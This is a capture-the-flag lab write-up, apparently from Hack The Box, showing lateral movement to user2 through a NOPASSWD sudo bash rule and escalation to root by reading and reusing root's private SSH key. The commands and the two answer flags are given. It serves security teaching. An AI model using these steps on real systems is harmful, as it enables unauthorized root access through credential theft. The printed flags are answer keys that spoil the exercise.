### Sessions Exercise
 
IP: 154.57.164.81
 
---
 
### Question 1:
SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.
 
I began by SSH'ing into the target on the specified IP, which granted me access to user1.
 
```diff
+ $ ssh user1@154.57.164.81 -p 31624
```
 
From there I viewed the user's sudo privileges, which state that the user can run /bin/bash as user2 without a password.
 
```diff
+ user1@target:~$ sudo -l
```
 
	User user1 may run the following commands on target:
	    (user2 : user2) NOPASSWD: /bin/bash
 
Seeing this, I use the sudo command combined with the -u flag to specify the user to run it as, then making the command be /bin/bash. This spawns a shell as user2, and I then `cat` the flag in my home directory.
 
```diff
+ user1:/home/user2$ sudo -u user2 /bin/bash
+ user2:~$ cat flag.txt
```
 
	HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}
 
&#x1F6A9; found **HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}**.
 
---
 
### Question 2:
Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.
 
From here I see if I have access to the /root directory, which I do. Looking around, I have read and execute access to .ssh, as well as read and execute access to id_rsa and id_rsa.pub.
 
I `cat` id_rsa and copy it over to my local machine, outputting it as an id_rsa, then attempt to connect to root using the id_rsa.
 
```diff
+ user2:~$ cat /root/.ssh/id_rsa
+ $ ssh root@154.57.164.81 -p 31624 -i id_rsa
```
 
	Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 6.18.24-talos x86_64)
 
```diff
+ root:~# cat flag.txt
```
 
	HTB{pr1v1l363_35c4l4710n_2_r007}
 
&#x1F6A9; found **HTB{pr1v1l363_35c4l4710n_2_r007}**.
 
